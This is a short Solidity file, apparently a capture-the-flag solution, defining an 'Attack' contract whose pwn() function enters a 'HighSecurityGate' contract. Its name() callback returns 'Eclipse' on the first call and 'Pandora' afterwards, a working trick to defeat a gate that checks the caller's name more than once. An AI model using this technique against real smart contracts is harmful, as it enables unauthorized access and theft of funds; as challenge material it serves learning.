// SPDX-License-Identifier: MTI
pragma solidity ^0.8.18;

interface HighSecurityGate {
    function enter() external;
    function lastEntrant() external view returns(string memory);
}


contract Attack {
    // uint256 var
    uint timesCalled;

    HighSecurityGate private target;

    constructor(address highSecurityGateAddress) {
        target = HighSecurityGate(highSecurityGateAddress);
    }

    function pwn() external {
        target.enter();
    }

    function name() external returns (string memory) {
        timesCalled++; // 0, 1, 2
        if (timesCalled > 1) {
            return "Pandora";
        }
        return "Eclipse";
    }

}